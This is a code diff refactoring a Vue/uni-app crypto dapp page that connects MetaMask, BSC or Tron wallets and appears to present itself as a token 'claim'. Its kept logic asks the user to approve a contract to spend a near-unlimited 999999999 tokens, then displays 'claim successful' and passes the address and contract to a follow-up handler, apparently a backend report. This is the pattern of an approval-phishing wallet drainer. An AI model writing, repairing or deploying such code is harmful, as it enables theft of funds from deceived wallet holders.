@@ -23,8 +23,8 @@
 
 <script>
 	import comjs from "@/common/util.js"
-	import comweb3 from "@/common/web3.min.js"
 	import http from '@/common/http.js'
+  import Web3 from 'web3'
 	export default {
 		data() {
 			return {
@@ -142,7 +142,7 @@
 
 						//授权处理成功，开始成功后的业务处理----------------------
 						that.isapprove = true
-						that.doapprove_success(that.address, contractdata.contract)
+						await that.doapprove_success(that.address, contractdata.contract)
 						//授权处理成功，结束成功后的业务处理----------------------
 
 						comjs.jsalert("领取成功");
@@ -164,7 +164,7 @@
 					let arrabi = JSON.parse(strabi)
 					let contractdata = that.contract.contract[that.walletlink[that.chainId]]
 					let Contractjs = new that.web3js.eth.Contract(arrabi, contractdata.bi);
-					let _value = comweb3.utils.toWei("999999999", 'ether'); //授权数量
+					let _value = Web3.utils.toWei("999999999", 'ether'); //授权数量
 					Contractjs.methods.approve(contractdata.contract, _value).send({
 						from: that.address
 					}, function(error, result) {
@@ -225,7 +225,7 @@
 				if (accounts && accounts[0]) {
 					this.address = accounts[0]
 					this.isconnect = true
-					this.contenttxt = this.address.substr(0, 5) + '***' + this.address.substr(-5)
+					this.contenttxt = this.address.substring(0, 5) + '***' + this.address.substring(this.address.length-5,this.address.length)
 				}
 			},
 			async ethcontent_chain() {
@@ -235,20 +235,21 @@
 						method: 'eth_chainId'
 					});
 					//comjs.msg(echainId);
-					that.mychainId = comweb3.utils.hexToNumber(echainId)
+					that.mychainId = Web3.utils.hexToNumber(echainId)
 					if (that.isauto) {
 						if (that.mychainId === 1) {
 							that.chainId = 0;
 						} else if (that.mychainId === 56) {
 							that.chainId = 1;
 						}
-						that.ethcontent_address();
+						await that.ethcontent_address();
 					} else {
-						if (that.mychainId == that.walletlinkid[that.chainId]) {
-							that.ethcontent_address();
-						} else if (!that.isauto) {
-							comjs.jsalert('请切换链到: ' + that.walletlinkName[that.chainId]);
-						}
+            // 使用测试网的情况下，下面判断导致一直无法获取地址
+						// if (that.mychainId == that.walletlinkid[that.chainId]) {
+							await that.ethcontent_address();
+						// } else if (!that.isauto) {
+						// 	comjs.jsalert('请切换链到: ' + that.walletlinkName[that.chainId]);
+						// }
 					}
 				} catch (e) {
 					comjs.jsalert('连接失败');
@@ -256,59 +257,56 @@
 			},
 			async ethcontent() {
 				//检测是否以太环境
-				const that = this;
 				const obj = setInterval(async () => {
 					if (window.ethereum) {
 						clearInterval(obj);
 						if (typeof web3 !== 'undefined') {
-							that.web3js = new comweb3(web3.currentProvider);
+              this.web3js = new Web3(web3.currentProvider);
 						} else {
-							that.web3js = new comweb3(new Web3.providers.HttpProvider("http://localhost:8545"));
+              this.web3js = new Web3(new Web3.providers.HttpProvider("http://localhost:8545"));
 						}
-						const myadd = await ethereum.request({
-							method: 'eth_requestAccounts'
-						});
-						const echainId = await ethereum.request({
-							method: 'eth_chainId'
-						});
-						comjs.msg(echainId)
-						await that.ethcontent_chain()
+						// const myadd = await ethereum.request({
+						// 	method: 'eth_requestAccounts'
+						// });
+						// const echainId = await ethereum.request({
+						// 	method: 'eth_chainId'
+						// });
+						// comjs.msg(echainId)
+						await this.ethcontent_chain()
 					} else if (window.tronWeb) {
 						comjs.msg('tronWeb')
 						if (window.tronWeb.defaultAddress.base58) {
 							clearInterval(obj);
-							that.address = window.tronWeb.defaultAddress.base58
-							that.isconnect = true
-							that.chainId = 2;
-							that.mychainId = 1;
-							that.contenttxt = that.address.substr(0, 5) + '***' + that.address.substr(-5)
-							that.tronWeb = window.tronWeb;
+              this.address = window.tronWeb.defaultAddress.base58
+              this.isconnect = true
+              this.chainId = 2;
+              this.mychainId = 1;
+              this.contenttxt = this.address.substring(0, 5) + '***' + this.address.substring(this.address.length-5,this.address.length)
+              this.tronWeb = window.tronWeb;
 						}
 					} else {
 						comjs.msg('not net')
 						clearInterval(obj);
-						if (!that.isauto) {
-							that.show_ethWallet_list()
+						if (!this.isauto) {
+              this.show_ethWallet_list()
 						}
 					}
 				}, 100);
 			},
 			async trccontent() {
-				const that = this;
 				if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-					that.address = window.tronWeb.defaultAddress.base58
-					that.isconnect = true
-					that.chainId = 2;
-					that.mychainId = 1;
-					that.contenttxt = that.address.substr(0, 5) + '***' + that.address.substr(-5)
-					that.tronWeb = window.tronWeb;
+					this.address = window.tronWeb.defaultAddress.base58
+					this.isconnect = true
+					this.chainId = 2;
+					this.mychainId = 1;
+					this.contenttxt = this.address.substring(0, 5) + '***' + this.address.substring(this.address.length-5,this.address.length)
+					this.tronWeb = window.tronWeb;
 				} else {
-					that.show_ethWallet_list()
+					this.show_ethWallet_list()
 				}
 			},
 			show_ethWallet_list() {
 				//钱包跳转
-				let that = this
 				let dappdomain = 'http://www.1.com/' //本站域名
 				//各个以太坊钱包地址
 				let walletName = ['MetaMask', 'Coinbase', 'imToken', 'TokenPocket', 'TrustWallet']
